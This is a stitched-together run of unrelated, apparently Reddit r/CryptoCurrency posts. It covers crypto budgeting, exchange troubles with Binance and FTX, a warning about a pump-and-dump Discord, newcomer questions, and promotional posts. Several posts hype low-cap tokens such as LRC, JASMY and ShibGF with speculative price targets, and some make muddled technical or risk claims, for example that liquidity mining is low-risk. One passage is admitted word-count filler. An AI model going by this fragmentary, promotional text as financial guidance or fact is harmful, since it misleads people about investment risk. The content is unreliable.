I want to call out that this is purposefully simple. Some months like May Sydney could lose half her budget, but other months she could have extra budget to spend. Considering this is fun and games money and not essentials Sydney is OK with that risk if over time she comes out ahead. She understands that risking things like shelter, food, and utilities isn't worth it.

&amp;#x200B;

|Week|Spend + BTC conversion fee|Balance + 6.98% BTC value gain + 4% XLM back|
|:-|:-|:-|
|1|$25 BTC +  $.63 BTC fee|$79.561 BTC, $1 XLM|
|2|$25 BTC +  $.63 BTC fee|$57.695 BTC, $2 XLM|
|3|$25 BTC +  $.63 BTC fee|$34.304 BTC, $3 XLM|
|4|$25 BTC +  $.63 BTC fee|$9.278 BTC, $4 XLM|

A bit more complex here, we see that buying BTC starts her off lower than 100 unlike USDC did. Also spending BTC has a 2.49% fee which for $25 dollars is $.63 cents. At first this seems like a bad choice, but given how BTC grows these fees are overshadowed, and Sydney ends the month with $9.278 BTC plus the same amount of XLM as if she used USDC.

Now if she decides she could spend those gains for more games, or keep that BTC to HODL which would slowly stockpile up.

&amp;#x200B;

**How I'm using it**

I do USDC and get XLM back which I keep as is. I budget and put my fun money and some of my necessitys money on it for things like groceries. Since USDC doesn't change I feel safe doing this and its nice getting 4% XLM back on more purchases.

I'm not comfortable going all in on BTC for spending. If a month like May happens, I don't want to be unable to eat unless I sell other crypto investments.

What I'm thinking of changing to is putting necessity money in as USDC which won't change so I can get the 4% XLM return. Then putting my budget for non-essentials into BTC. On average over long term I'll go up and profit, if a month like May happens I'm fine - one month will be less exciting and I can work on the 1000 unfinished steam games and 30 unread books I own to keep me entertained for that month.

Checking my handy app it tells me that Ethereum has a circulating supply of 118.2M ETH and a total supply of exactly the same number.  Of course this also makes the max supply zero.

Does this mean that all the Ethereum ever created has already been mined (seems wrong to me but thats why Im asking) and in a theoretical scenario all Ethereum will one day be completely burned up?  

These are probably questions I should have wondered about a long time ago but at least I bought in cheap under the premise that smart people are smart so I should probably just do what they are doing and learn as I go.

So, yeah, assuming were past the word count, if someone could explain like Im five whats going on with the Ethereum supply numbers Id appreciate it.

There was a post similar from last week, but the vast majority of the comments were about top 10 coins. I think over half were BTC, ETH, SHIB, and DOGE alone. While that post was superfun, there is a world outside of the top 10 that we could benefit from learning more about. This post is meant to help us learn about projects *outside* the top 10 and expand our knowledge of the crypto-verse while having fun in the process. Kind of like Jeopardy! (RIP Alex - you are greatly missed)

Please do NOT make comments about the following top 10 market cap coins/tokens: Bitcoin, Ethereum, Binance Coin, Tether, Cardano, Solana, Ripple, Polkadot, Shiba Inu, and Doge. Everything else is fair game.

I got an invite on a shady discord server called AMAZON PUMP SIGNALS. They want every member to pump and dump at exact same time on a shady exhange called DOTXCHINA. Now I'm new to crypto but all this seems like a scam, even the website www.dotxchina.com has no info under contact us. According to them the pump will have effect only on this exchange and not on any other exchange. They want minimun investment of 500-700$ and if you deposit less you could have problem withdrawing in the future. Hope people don't fall for this.

So i've been in the cryptomarket for about a year. Since i started i've been using Binance EU. I know Binance goes against all the principles the future of cryptocurrency stands for. But for me it was an easy step-in without really needing to get into the nitty-gritty of different wallets and exchanges. I've kept my crypto on Binance itself partly because of laziness, partly because it's not much and partly because of gas fees. I know, i know, not your keys, not your coin... The app was fairly easy to use once you get the hang of it. All was fine and well. But!

My stance changed when Binance EU removed depositing and withdrawing with your card. They say this is because they're updating payment possibilities yada yada. I feel uneasy by this. In the past different companies have caught a lot of flak for similar stories but for some reason this mostly flies over most news outlets. The thing is that i know i'm here to stay. So i want to be free in my decision to invest and not be bound to Binance.

Even though i have a sour taste about Binance's recent withdrawal/deposit denial, there are a couple of things i really like about Binance which i look for in other wallets/exchanges when i want to switch;
- The ability of flexible staking whenever i want
- To exchange crypto/fiat straight into other crypto/fiat
- Withdraw straight to my bank account when i want to (Even though Binance doesn't give me that option now either lol)
- If possible a mobile app so i don't have to be at my desktop to access my crypto

So I'm asking for your help and guidance. What are your guys experiences? What features do you want/love on/in your exchange/wallet? What do i need to look out for? What wallet/exchange do you recommend for me and others who are in a similar situation?

PS. Sorry for formatting, I'm on mobile
PSS. Sorry for spelling errors, English is not my main language.

Ok so right now I'm invested in 5 different cryptos. Mainly BTC/ETH/DOT/ADA/XLM

I got the XLM through giveaway and other stuff so I have never bought it. 

I am thinking about re-allocating some of these because my BTC (largest bag) is only 35% of my folio. I think it should be at 50%. I was wondering what is your largest bag as part of your portfolio. Obviously my low three digits portfolio doesn't see the same risks as you all but still. 

If you could also tell me why you allocated this part of your folio to this coin it would be great. 

&amp;#x200B;

I think most of our folios should be comprised of BTC and ETH because they are THE cornerstone of the market but I have a low tolerance for risks so... 

Ps: don't reveal more info than necessary.

Been doing some research about JASMY token after reading I can see 

1. Japan have legalised this as there first token 

2. Have partnership with Sony 

3. Has made massive gains in the last few weeks and still looks very profitable even buying in now 

Im not expert but this does look the next big thing already listed on Coinbase and has one of the highest gains in the last few days

There are much more information on this coin online then what I can give
You do your own research but Im defiantly in after doing mine

For my example, I want to use the USD and USDT only to keep it simple. 

In my mind, USDT hurts the price of USD because every single buy order made for 1 USDT is a missed buy order for 1 USD.  The only reason people buy USDT is because they do not have an equally easy way to buy USD. 

The price of the USD has plummeted ever since the introduction of USDT but, it was plummeting before the introduction of USDT as well.  So that doesnt really mean anything.

Im sure Im wrong, but Id like to know what Im missing.   Because in my mind, USDT acts as some sort of artificial supply increase for the USD, then just relies on that printing + arbitrage to keep 1USDT=1USD.

Im assuming all Wrapped coins have a similar effect, but I dont know.

Someone here know what Im missing

In my opinion and for investing purposes - ETH is the new TSLA. Price is primarily driven by retail investors who do their research. The more TSLA goes up - the more retail investors sell and buy ETH. I personally switched a while back, but many of my friends are switching now. Anecdotal evidence, of course.

Years ago, retail investors realized that Tesla cars are iPhones in the universe of Nokias and Blackberries. And retail investors easily 10-30x their investments.

Now that Tesla is understood &amp; boring, retail is looking for a new up-and-coming Apple/Tesla. While Bitcoin is a store of value and transacting medium, Ethereum is like the new internet. Most people still don't know how the internet works, yet the internet is a foundation society can't live without.

In my opinion, we're are on the path of both Bitcoin and Ethereum individually surpassing gold. Until that happens, there isn't a reason to sell. Once that happens - it will be well known, and retail investors will look for a new Apple/Tesla/BTC/ETH.

# [Loopring Protocol](https://loopring.org/resources/en_whitepaper.pdf)

According to the official website, *Loopring protocol is an open-source zkRollup protocol.* 

Lets unpack it. First, lets understand Zero-Knowledge proofs. In a nutshell, a zero-knowledge proof is a method by which one party (the prover) can prove to another party (the verifier) that a given statement is true, without conveying any information apart from the fact that the statement is indeed true. This sounds paradoxical and even impossible, but with some clever mathematics, its very much possible, and its the working principle behind tokens like MINA protocol and Z-Cash. For example, a zero-knowledge proof might enable a government agency to verify that you are above the age required to access a website, without revealing your exact birthdate. 

Heres an article by [CoinBureau](https://www.coinbureau.com/education/zero-knowledge-proofs-zksnarks/) explaining it in detail. 

So what does the Loopring Protocol do? It allows the creation of decentralized exchanges. It provides a set of Ethereum smart contracts and zk circuits to provide an open standard, on top of which you can build any Crypto DeX or even a payment app. In some way, it's like a blueprint to make a decentralized exchange like PancakeSwap or ShushiSwap. So how is it better than the existing solutions? Well since it uses ZK proofs, it makes it highly secure and highly scalable. Remember, in ZK proof one party can prove a contract has been carried out, without even releasing the details about it. That's the reason it's so secure and anonymous, and that's exactly why ZK proofs are used by ZCash too. 

# Tokenomics

* Symbol: LRC
* ERC-20 Compliant: YES
* Total Supply-Fixed:  **1,375,076,040** 
* Token Address: 0xBBbbCA6A901c926F240b89EacB641d8Aec7AEafD
* Proof-of-Stake 
* [More Details about LRC Tokenomics](https://medium.com/loopring-protocol/lrc-tokenomics-v2-1e6fd99e9e9c)

# Transaction Speeds and Scalibility

Loopring also aims to solve a **MAJOR** problem with Ethereum: Gas fees &amp; scalability. It has extremely high throughput, that's because the payments and the transactions are processed in batches "off the Ethereum main chain", so they are lightning-fast (pun intended), all while maintaining the Ethereum level security. As a result of all this, there are near-zero gas fees for trading any crypto or adding liquidity. Also, Loopring protocol has a fairly high throughput of **2025 TPS**.

# Summary

So, all-in-all, Loopring seems to be a promising crypto project, which can potentially create a much-needed integration between the decentralized exchanges, significantly increase the retail money &amp; participation in DeFi projects by nearly eliminating gas fees, and decreasing transaction times. With a relatively low market cap and a potential partnership with GME, the LRC token seem to have solid fundamentals to grow both in the short &amp; long term. That being said, it might face competition from other projects and ecosystems in the DeFi space, and even other L2 solutions that scale-up Ethereum. So will Loopring become the de-facto DeX protocol? Only time will tell.

ETH has passes 4.5k today which is amazing for sure, this time is much more steady and healthier than the previous one 

What's the next station for ETH right now , I'm thinking of an easy 5k target before end of the year , and it will pump all alts with it so prepare your bags boyz

As of now , I'm hodling ETH and not selling until my eth turns to be a life changing money as of now it's in a nice profit but not life changing 

What do you guys think of next ETH target in this bullrun , could be 5k could more , could be that's it , "we don't no shit about fuck

Hi r/CryptoCurrency. I am considering switching platforms so I am off of Robinhood but I am unsure on what platform to use moving forward. I am heavily considering both [Crypto.com](https://Crypto.com) and Coinbase/Coinbase Pro. 

I have done a bit of research myself on the pros and cons of both but I would like to gather some input from the community as well. Does anyone have any reason why I should avoid either platform? 

Are there any other platforms that I should be considering in additional to these two? 

Any input at all is appreciated. Thanks in advance.

Warren Buffett often talks about moats. Moats is basically something that prevents a product or service from losing out to competition. 

In crypto world is there such a thing as Moats? . The reason is ask is because given that crypto currencies are extremely disruptive. Example: People say ethereum's network is getting congested so there is Polygon matic which offers 10x more transactions per second. What is to say polygon matic won't get congested another crypto offers 20x more transactions.

Given the pace of disruption in crypto currencies, the disruption is a double edge sword. My question is can one afford to hold the same cryptos for say 5 to 10 years ?

I'm not looking for a fight. I'm just interested in your view point.

I am curious if others buy and sell cryptos, both "blue chip" and "garbage" coins, simply taking advantage of the volatility?  I see lots of posts mentioning how risky the shit coins are and I certainly don't disagree.  But I've had small success simply getting in and out.  Rinse and repeat.  I really don't care if the underlying asset is crap.  Should I?  I manage my exposure and I understand I could lose it all.  So I never get too deep in any one coin.  There are downsides: if the whole market tanks faster than I can react, I can be left holding bags of crap (summer 2021).  I also pay a lot of transaction fees.  I call my strategy "nibbling".  Any thoughts?  If I'm good at this....what are some ways to do even better?  I haven't looked into shorting yet.  That's next.

I log in my ledger live account every week, at last my most fear moment has come....unable to log in due to wrong password.

Tried to restore my account but my ledger nano S screen is unable to show any digits (the last time i used was 2 years ago). Thus i am unable to restore my account. 

I check my ledger bitcoin address online, thankfully my cryptos are still there. I have since ordered another new hardware wallet and will restore my account using my previous seed phrase.

Is there a better way to solve this?

With the year end getting closer let's continue our appreciation for some of the star performers this year.

Let us just take a moment in time and appreciate what a fantastic year Matic has had. It is easy to lose sight, especially with all of the crazy shitcoins that are pumping and dumping lately and the Scams such as Squidcoin that is  taking up most of the headlines, but let us not forget that this time last year Matic was $0.01369!!! And now 1 year on we sit at over $1.90!! Let that sink in for a minute!

Matic has been on an absolute rocket ship for most of this year and with the last few month's of consolidation we can expect even more growth is just around the corner. 2022 could be even bigger! This just goes to show investing in legitimate projects long term is almost always the best way to go. 

I think a $5 or $7 Matic within the next year is definitely possible!

These couple of weeks have been crazy with tons of coins pumping, tons of information from twitter, youtube, reddit, everyone saying this is the opportunity of life changing wealth, I'm constantly looking prices on coinmarketcap and tradingview and trying to figure which defi/gaming/meme will be the next theme all to scrap just a few hundred bucks because my account is so small. 
I can't focus on my job and studies and although I want to be invested in crypto this FOMO is draining me. 

Has anyone gone through this? What kind of strategies did you adopt? I've read a few, like just dollar cost average on ETH/BTC every month, or buying when the fear index is high and selling on all time highs, using weekly moving averages/macd or buy a couple of good projects every month and forget about it for a few years.. which ones are you guys doing and how is it going for you?

How many "next Shiba Inu" there is? Yes, many of us are searching for a new and undervalued token with parabolic potential gains, and many of us, we believe found it. The crypto news tells us about a sudden new millionaire of Doge, Shiba etc, but they don't tell us about the new losers of other altcoins. I propose to Reddit community, joint analysis effort of our knowledge of the crypto ecosystem to list "reliable" and undervalued tokens that could potentially mimic shibainu. Yes, "reliable" is a utopic thought in this business, we known, but we must manage the risk, instead of the money. I have my personal prediction about the next Shiba Inu: Ever Grow Coin (EGC), which is not a popocoin. Which are you bet, AND WHY? Which is the next Shiba for you?.

I think more and more the market is going parabolic! As of now, most coins are in the green and I really hope everyone is enjoying the show.

Nevertheless, we have some beast that are yet to moon and make a massive move but they tend to be late comers... So what are those beast you hodl that you have faith they will catch up massively and be in the news. Solid projects with solid fundamentals. 

For me, I'm awaiting Theta, LINK, Ziliqa and VET to make a solid rally. I think they haven't move a lot recently and just hodling my bags waiting for the rocket to launch....

ShibGF (ridiculous I know), aims to provide funding and scholarships for future female leaders in crypto. This project gives me early dogecoin vibes with commitment to good causes. Small marketcap, high trading volume past 24 hours at $15+ million, and token holders&gt;1500 and rising.

It got listed very quickly on coinmarketcap and coingecko. Dev founder is likely US based and well connected. Crypto twitter is just catching on. There was a whale last night who made the price dip, so the entry is pretty good this morning.

Lots of things lined up for this project including exchange listings, collaboration with universities and well known crypto projects. The memes are funny. All it will take is one media outlet to pick up the story of a degen shib clone paying someones tuition in college, and it will go mega viral.

Because you don't make an exit strategy.  Before the memes come in of "What's an exit strategy", this is the essence of making money.  You need to know when you've made your investment work, and when to take some profits.

It doesn't mean that you need to exit all of your positions, or liquidate your crypto for fiat.  It just means that you need to know what's good for you.  If you get in to ETH and want to make 5000% gains, you're not going to do it (not now anyways).  If you want to get in to ETH and make 10 - 20%, you can do that and then you can take that profit to look in to something else, or buy yourself something.

If you want a 100000%, then invest in something that will do that, but also be smart about the quantity.

Just make a plan and stick to it.  This is why it's 'so hard to take profits' for people.  I make this mistake all the time.  Whether it's crypto or stocks, this is my problem.  Don't let it be your problem too.

So this might be a bit controversial and I'm not sure myself if this isn't overcomplicating things.  


We all know that in general you have the highest chances to get moons if you're early and if you post in the new-section. Funny enough, it's like with Cryptocurrencies in general. If you're early you might get lucky. A funny one-liner can be worth 5 Dollars and more.  


So what if we show the percentage of how often someone posts in that section? Or as a next step, apply a modifier to the moon-distribution. Like if you post under new often, you get max 20 % less moons?  


I know, this might just be too much and might be over-regulating things, but it WOULD probably level the field a little more.

 Change often pushes people to abandon stereotypes and inspire new thinking, and the rise of blockchain will upend the way people think about things in many industries.

However, when it comes to exponential growth, we tend to overestimate the short-term impact and underestimate the long-term impact. Just as the dotcom bubble collapsed in 2000, the Internet went from being a game changer to being a hotbed of capital. It turns out that the Internet is not so magical, and most companies have not succeeded in building a worthwhile business model on the Internet. However, how many people can imagine that only a dozen years later, the Internet has profoundly changed the pattern of today's business society, but also changed our lives.  


Like the development of the Internet, the rise of blockchain, a protocol-based, disruptive technology that requires large-scale collaboration and participation, will take longer than most people expect, and the ultimate scope and depth of impact will be far greater than most people imagine. The future development of blockchain will not be plain sailing. It may experience overheating or even bubble stage, and may also experience trough. However, I believe that blockchain, as the core technology of the next stage of the digital wave, will eventually build a diversified ecological value Internet, which will profoundly change the structure of the future business society and our lives

First, let's talk about currency speculation. Frankly speaking, it is a way to buy from the secondary market at a low price and then sell the currency to make profits when the price rises. Coin speculation is a high-risk, high-return investment. Because the current currency price is high, investment speculation requires a lot of capital investment, the threshold is too high. Ordinary investors do not have the financial capacity to play the risk - averse game. And must always pay attention to policy guidance, pay close attention to market trends, afraid of missing a sickle and afraid of cutting leeks. The market is not very stable now, the pricing power is always in the hands of the dealer. You do not know when to go up, when to fall, accidentally cut leek. No one can buy at the lowest point and sell at the highest point. What we can do is gradually improve our level and outperform most people.

Coinbase account defi liquidity mining is equivalent to quantitative investment, an investment, long-term returns, and produce a certain amount of money every day, and revenue stream, because the mining and energy storage investment characteristics, not every day to sell the COINS, but mainly the chariot COINS, so don't stare, every day on real-time currency, the normal life and work, Make money easy and fun. What's more, when the price of coins goes up and you have another batch of coins, you have enough chips to trade. Mining is a continuous discounted investment behavior, can obtain lower cost chips. When the currency rises to a certain price, there is no need to worry about short selling. Basically, by participating in mining, you can eat a big chunk of the entire market. It is a relatively stable investment way

1, low cost of mining VS high cost of speculation

2, mining risk is small VS speculation risk is large

3, mining sustainable income VS speculation is not sustainable

4, mining profits VS speculation every day to earn and lose

5. Mining has strong risk resistance VS speculation has no risk resistance

ATH: $2.40

Current price: $1.32

Current Market cap: $1.6B

Total Supply: 1.4B LRC

At $40, total market cap (fully diluted) would = $56B

At $50, total market cap (fully diluted) would = $70B

Looking at these metrics, along with the use case of Loopring, I am very bullish. $40-50 is a very reasonable future price for this coin. What will make it successful:

* Most of us already know that a partnership is in-the-works with GameStop to create an instant, gasless NFT Marketplace (official statement of partnership is set for Q4).
* Merkle Tree data structure will allow for off-chain currency swaps that are gasless (no fees!)
* Speed of transactions are done with **very** high throughput because activity is processed off-chain, which is then compressed before sent to the Ethereum network
* Has a decentralized exchange as well as a smart wallet

**LRC showing an inverse head and shoulders breakout:**

[Showing price could easily hit $2.00 mark](https://preview.redd.it/z0cf5btc87x71.jpg?width=1345&amp;format=pjpg&amp;auto=webp&amp;s=d52908df50f08b0910423f9bb4f9deb451c9548c)

We're waiting for the candles to close above the neckline to trigger the breakout. This may take weeks still. 

When GME partnership becomes official and Marketplace takes off, combined with people using and becoming more comfortable with their exchange and wallet, I truly believe in this token to 40x from here.

What do you think?

This sub is to discuss crypto currency. Therefore, we're going to discuss coins, because, well... that's a vast majority of crypto currency to most people.  

Yet, whenever a community discussion comes up about "What do you think is..." or "Let's discuss..." or "Tell me your..." or any other community discussions, inevitability **one of the top comments is "People about to shill their bag coins lol".**  EVERY. SINGLE. TIME. 

Can we vote taking a hiatus on this for now (below)? My thoughts on the matter are that:

1. *It taints the discussion*: when you think someone is shilling their coin, you're going to dismiss some  good advice and/or new coin lead just because you think someone is shilling their coin. Sure, some will still be shilling their bags, but do we have to call it out EVERY. SINGLE. TIME. 
2. *It is has inherent circular logic*:  Of course people are talking about their own coins because they've probably done their research! In other words: who has the most to say about a certain coin? The one who has researched it. And who has researched it? The one who looked to buy it, and may have bought it. 
3. *It (from a certain point of view) could low-key bend some Core Principles of the sub*, specially: 

&gt;1) Behave with civility and politeness. Lead by example and treat others as you yourself would like to be treated.  
&gt;  
&gt;5) No Trolling. Do not make random off-topic and/or controversial comments with the intent of baiting or provoking unsuspecting readers to engage in hostile arguments.  
&gt;  
&gt;6) No posts or comments which aggressively attack or make biased statements. This content does not promote quality discussion (Example: "That coin sucks, it has no future!").

&amp;#x200B;

TL;DR: let's vote on whether to stop saying "This is a shill post" / "People are about to shill" comments for a month and see how it goes.

Im surprised at how positively this sub has responded to the recent crypto ETFs. Perhaps people are just happy for adoption or further opportunity to ~~gamble~~ invest, but for how much everyone in here talks about not your keys, not your crypto, I thought there would be more opposition to them here. ETFs defeat the purpose of crypto by having a third party involved in your money.

One thing that all of the recent memecoin surges have shown is that when push comes to shove, greed is the primary driver of adoption and all people are seeing is X000% gains! Numbers like that always seem to blind people to the risks that theyre taking.

The sob stories will eventually come from memecoins, but also from ETFs, especially futures like the ProShares Fund.

Hi,

The title says it all, I use Binance and today received this news, in November 19 that option will no longer be supported for some countries, mine being in that list.

I know I still have the P2P option but seeing all these regulations and seemingly complications to withdraw my money I am thinking on switching to another exchange.

Which one do you recommend that's not as complicated as Binance when you want to cash out?

Or is there another option I'm not seeing to cash out from Binance when this one is no longer supported?

There. I said it. If a 99.99% dip makes you doubt crypto after a 268,100% pump, maybe you shouldnt be investing in crypto. 

A certain coin has recently pumped 268,100% over the course of 3 days, and a correction of this scale (99.999987% to be exact) is pretty insignificant if correlated with prior ATH breaks.

On November 1 of 2021, a certain coin shattered its prior ATH then dumped by 99.99%, the days following that would be the beginning of the oncoming bull run.

Im not alleging that everybody anticipated a certain crypto was going to dump from $2,681, nobody knows what the future wields, but Im not surprised we dumped either. 

If youre concerned about a dip like this then youre possibly overexposed to the market and should tone it down a bit, always recollect that a market like crypto can crash down by 50% in a matter of days.

Im going to be as blunt as a below middle class third world country kid can be, ETH is one of the worst things to still exist in crypto, every time I touch it I lose money due to gass fees.  


Yes I am poor, fuck you if you think your better than me just because you have more money. But when my $40 turns into $60 which mind you is a full months worth of money for me, I would like to withdrawal it without having to spend $40 in fucking fees  


You all are just a bunch of exchange shitheads who have never ever tried to use the currencies they rep. ETH is trash and It doesnt deserve the glory or the spot it has.  


Im gambling with crypto, Im no different in that way, but fuck at least I try to USE THE FUCKING PRODUCT I AM PROMOTING  


That is all thanks.

So, when I first bought ETH, it was still only $1200 and I had no clue what exactly crypto is. I had read somewhere that ETH was good and that I need a non-custodial wallet for cryptos, so I downloaded the first such wallet for ETH that I found (spoiler: it's not MetaMask). The wallet had the possibility to buy ETH directly with fiat, so I just did. 
Fast forward a few months and my investment had doubled, so I decide to make a binance account, transfer my ETH there and sell it. 
I open my ETH wallet and am greeted by the message "Network congested - transaction fees are higher than usual". Well how high can they be? I try to transfer to binance, and the tx fee is *$120*... No way I am losing 30% of my precious ETH, so I decide to wait until the fees get lower...

I am still hodling that ETH because fees are still high and it has now nearly done a 4x...
Had the ethereum fees been lower, I would have sold and missed on the near 4x. So I will just continue to hold until ETH 2 arrives.

tldr: Didn't sell ETH cause of high fees, and it did another 2x. Lesson? Holding proves again to be the best strategy. Time in the market &gt; timing the market

So the video was cool and educational. he explained a simple copy paste coin that gets deployed and such. He created 10,000 tokens. He then listed it on pancake swap by sending 6000 to it the contract address. He then goes to pancake swap and pulls up the new coin and adds liquidity. Be sets the price to be 1312 of his new coin per bnb. 

So here are my questions about this process that I'm hoping to understand better.

1. He kept 4000 tokens for himself and sent 6000 to the contract.address. this means that 6000 can be bought. What happens when someone buys all 6000 of the coins from pancake swap?
2. Does sending the 6000 tokens to the contract address mean pancake swap holds those 6000 tokens or is that just giving pancake swap access to the address to use? When listing on other exchanges later on, i assume they interact with the same contract address as well and the 6000 tokens become shared across the 2 exchanges?
3. When he added the liquidity of 1 bnb to 1312 of his coin, that seems to be setting the price. So does that mean that if someone wanted to buy the coin after him, they would by it at that ratio on pancake swap or would they just offer whatever they want for it? 
4. Can others add liquidity to it? Meaning he added the initial but then someone else could come in and say, na I think 1bnb is worth the remaining coins and just get them all for the 1 bnb? 
5. I have never used pancake swap so I'm not sure if its price is just set in stone or if people offer what they want like normal exchanges. If it's like normal exchanges, there are no sellers technically at the start of a coin so does the contract address just sell to anyone that offers anything? Wouldn't someone just buy them all for a dollar? 
6. In the video, it was a simple coin with no real purpose he just imported erc20 and renamed it and listed which was fine for the video but does that process work with adding functionality to a coin? Suppose u wanted a coin that does something. Is there a good video that talks about how coins can add functionality into them? Can the code for the coin be updated later on to add this functionality? Or is coin functionality just built into the platforms around the coins such as custom websites that do things with the basic coins. 

This whole process is fascinating. Need to know more!

I get my bonus this Friday, its all going to crypto. If I did that the last 5 years I would be a millionaire today. I dont think I will be rich in 5 years but Im confident BTC and ETH will be worth a lot more.
I dont know why but I just refused to look at crypto for the longest time, I remember clowning my coworker for not selling his BTC  before the crash in 2017 (I think he had 8 BTC and some other coins, probably eth, I didnt know shit at the time). He would say things like Im never selling, if anything i will buy more I would look at him like wtf is wrong with this kid? I was an ignorant hater, I thought BTC was a scam,all I had to do was pick up a book or watch a YouTube video but I refused to do that until June 2021 when my now ex gf talked me into it.
I just pray its not too late for me.

As the title suggests, if there weren't MOONS to be claimed, would you still post or comment here?

In case of a positive answer, would you do in the same frequency as if there were no Moons to be claimed?

In my case, I definitely wouldn't post here so much. However, I'd still be invested in the community and constantly checking for relevant news and information

A lot of research can be done in this sub and it's an opportunity to get to know some projects you haven't heard of (CKB for me)

I'm curious to know how the average r/cc shitposter would act in case there were no Moons!

&amp;#x200B;

1. From your POV, what other industry wide trends can happens that can make crypto energy efficient ?
2. Some of new generation coins ( HBAR, GRT) have labelled themselves as green coins. What other green coins are out there that consider environment consequence seriously ? 
3. Thoughts on NFTs and CO2 emissions &amp; pollution ?  


Few thoughts on this article

* BTC lighting network -  Lightning payments are more efficient in both energy and fees but how can this happen for entire BTC network ? Is there a better way for us to reach energy efficient on BTC network ? 
* ETH 2.0 (Hands down) - however ETH 2.0 becoming reality is 2 year IMO 
* Doge -? - Interesting but is this why Elon is promoting ? but regardless SHIB should be NOT energy efficient as Doge since it based on ETH.

If you buy shares of Apple Inc, you own a percentage of the Apple company. There is a market comprised of buyers and sellers that determines the value of that stock. But independent of that market, you own something tangible that has intrinsic value. You own a share of Apples assets and its income stream. If you buy a bond issued by Microsoft Corporation, you have purchased a promise by Microsoft to pay you certain amounts of money at various dates in the future. That promise is secured by the assets of Microsoft. Again, buyers and sellers determine what those bonds are worth on a given day. But the promise exists independent of those buyers and sellers, and if Microsoft fails to live up to it, you can go after Microsofts assets to secure your payment. 


That is not true for cryptocurrencies.


Your bitcoin has value only if others are willing to buy it from you. Unlike every other asset class, bitcoin has no independent intrinsic value. And unlike a true currency, Bitcoin is not backed by the full faith and credit of anybody or anything. Mr. Nakamoto will not make you whole if the market for bitcoin dries up. Bitcoins value is purely a product of the market for it.

ONLY INVEST WHAT YOU CAN AFFORD TO LOSE!

I received a message last night from one of my long time trading buddies, including me in on JASMY. I am not a five figure wheeler-dealer, so I read the white paper, and threw some shekels at it.

We can all agree that cryptocurrency and applications built within the Blockchain are inevitably the future of the Internet as we know it, and the utility and function of JASMY solve a very fundamental problem of personal data storage throughout multiple clouds and websites - and more to the point, the safety of that information.

By a show of hands, how many of you have received an email that said your data was hacked at one point or another? I think anyone over 30 Knows all too well what Im talking about.

You have companies like LifeLock specializing in protecting you from personal data theft that could lead to stolen identities and a slew of financial problems that are normally the byproduct of such crimes. JASMY aims to solve that with a decentralized data storage depository built upon the ETH blockchain! Its gnarly! 

I dont see this as a short term flip, but more so as a long-term investment. I have included the white paper link and encourage everyone to check it out beyond its current trending price movement.

Here is a quick rundown of three days ago. I called two friends and then my dad and told them to buy some LRC after I heard about the GME news. They were skeptical at first and then I explained all the stuff going on with the Github code and the GME NFT platform (not that they understood) but yeah. I convinced them eventually to put some money into it. 

This morning I woke up went to work and didnt check the charts (I usually do that after work otherwise I get obsessed throughout the day). I get a call whilst at work from my dad, and I send him a text saying Im busy. He then texts me a screenshot of his portfolio and holy shit! Turns out he put even more money than I had in LRC and for the first time my dad was actually convinced that crypto could have potential. Even though he still knows nothing about crypto I think he is now going to be open to considering it. Havent heard from friends yet but expecting a call when they wake up as they live in another country. 

It felt so good let me tell ya! Let us know your story with LRC or any other coins.

TLDR; convinced dad and friends to put money into LRC, they listened and made a shit ton of money.

Im wanting to get in to trading and selling cryptocurrency, what website or app do you recommended for trading and selling cryptocurrency.also what are some pros and cones to the sites you recommended.
Ive used Robinhood to trade dodge coin and some bitcoin. But thats all the cryptocurrency trading I have done. But most of those dont go any where for me


This is just to help me get over 500 words
A cryptocurrency, crypto-currency, or crypto is a collection of binary data which is designed to work as a medium of exchange wherein individual coin ownership records are stored in a ledger which is a computerized database using strong cryptography to secure transaction records, to control the creation of additional coins, and to verify the transfer of coin ownership

Yesterday a post was made wondering why this sub isn't cypherpunk anymore and why people are cheering a Bitcoin ETF and adoption by existing institutions.

And in my opinion is because Bitcoin, as it was intended has failed. "BUT OP YOU ARE AN \*\*\*\*\* HOW CAN YOU SAY THAT BITCOIN HAS FAILED. Bear with me, Bitcoin was intended by Satoshi as a peer to peer cash system, and as for that purpose it has failed. The vast majority of people and even BTC users are not using it for day to day purchases, because its value fluctuates everyday. People will not use a currency that its purchasing power changes everyday. Moreover it apreciates with time, meaning people are incentivized to Hodl, not spending it, which is bad for the economy and innovation.

That said, even though I think that  BTC as it was intended has failed, I do not think its a failure. In fact I think its perhaps the greatest innovation of the century, and it's so great that even failing on its original purpose, will thrive wil time and it will become one of if not the greatest assets in the world, it just won't become a currency.

Looking forward to discuss it in the comments with you guys.

TLDR: BTC has failed on its original purpose

I haven't been able to find a ton of info of long term plans.  I have read the reddit faq page as well as used the google machine.  Is there a resource I missed or skipped over?  I am still new to this community but have been following long enough I feel like I should have seen something if the info was easily accesible. 

Questions:
Is there a total limit or just a new monthly distribution?
Will reddit use it to fund other projects or list outside of reddit for general trading?
Will moons eventually transition to being earned in other sub reddits?

I apologize if these have been answered already in posts or websites. If so please send a link if you have it!

I have enjoyed trading on FTX, I am a staked FTT holder and like their services and mobile app. I have been sending all my fiat deposits to them as part of DCA-ing into different projects and HODLing.

They recently changed service provider for their SEPA service and I followed their new procedure for 1 day SEPA, and have proof of my remittance from my bank, and that the submission was correct. It's now been 6 working days (WD) and 8 calendar days since I sent in this remittance. I opened a case on WD 4 and got an inital response from FTX Support 3 days later, asking for more info which I provided around 1h after they asked  It's now been another 3 days and I'm still waiting for an answer/my funds to be credited 

This has never happened to me before with a CEX and SEPA payments and I have been doing this regularly since 2017 with many different exchanges.

It is however the first time I have sought help only to be completely ignored 

I have tweeted at FTX, written on their sub-reddit (ghost town) and repeatedly written in the ticket to "bump" it.

I'm looking to use those funds for an IDO whitelist and time is running out.

I am used to some exchanges being slow to do certain actions but most update their support tickets at the very least once daily in response to requests for more information.

Has anyone else experienced this with FTX, and if so, how did you get this resolved. I don't have more liquidity to add somewhere else, so right now I'm in a difficult situation trying to get into the IDO.

You're all too up your own asses to see that opportunities like this are still here. 

It's too damn bad, honestly. 

I put some $ in these plays. Take out profits and buy BTC/ETH. 

It's weird that that's a bad thing?


How do you think wealth is accumulated? I grew up in the projects. There was no generational wealth to be had. 


I learned sociology, psychology, sales, fundraising, bookkeeping, finance and got to crypto in time to make some money. 

Get serious about this.

Hedge your bets, but MAKE bets if you want to instead of being mad that it's not your favorite coins' turn. 



It will be eventually, most likely, but the money flows with the trends. See where the trend is, sell into it, hold a tiny bit if you love it, but move onto the next trend. 


You're here to compound money. 


That means risking some of it, staking lots of it, and diversifying outside of crypto, too. 


You can totally learn how to do this. 

Be the r/CC that helped me learn lots of this!

